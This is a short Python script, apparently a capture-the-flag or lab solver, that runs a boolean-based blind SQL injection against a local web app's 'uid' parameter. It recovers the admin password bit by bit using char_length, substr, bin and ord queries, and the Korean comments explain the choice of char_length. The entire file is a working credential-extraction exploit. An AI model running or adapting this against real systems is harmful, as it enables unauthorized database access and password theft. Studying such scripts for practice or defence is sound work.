#!/usr/bin/python3

import requests

HOST = "http://127.0.0.1"
PORT = "8080"
URL = HOST + ":" + PORT

#uid = "admin"
upw = ""


###################### password length check ######################
pw_length = 0

while True:
    pw_length += 1
    # query = f"admin' and length(upw) = {pw_length}-- -"
    query = f"admin' and char_length(upw) = {pw_length}-- -"  # 인코딩 고려하여 계산 (ex. ascii 만으로 이루어지지 않은 경우) char_length 사용
    res = requests.get(f'{URL}/?uid={query}')
    if "exists" in res.text:
        break

print(f"password length: {pw_length}")
###################################################################


############## Find each characters bitstream length ##############
for i in range(1, pw_length + 1):
    bit_length = 0

    while True:
        bit_length += 1
        query = f"admin' and length(bin(ord(substr(upw, {i}, 1)))) = {bit_length}-- -"
        res = requests.get(f'{URL}/?uid={query}')
        if "exists" in res.text:
            break

    print(f"bit length of character {i}: {bit_length}")


    ############### Find each characters bitstream ################
    bits = ""
    for j in range(1, bit_length + 1):
        query = f"admin' and substr(bin(ord(substr(upw, {i}, 1))), {j}, 1) = '1'-- -"
        res = requests.get(f'{URL}/?uid={query}')
        if "exists" in res.text:
            bits += "1"
        else:
            bits += "0"

    print(f"bits of character {i}: {bits}")
    ###############################################################


    ################### Bitstream to character ####################
    byte_length = (bit_length + 7) // 8
    upw += int(bits, 2).to_bytes(byte_length, byteorder="big").decode("utf-8")
    ###############################################################

    print(f"make answer: {upw}")

###################################################################
print(f"admin password is {upw}")
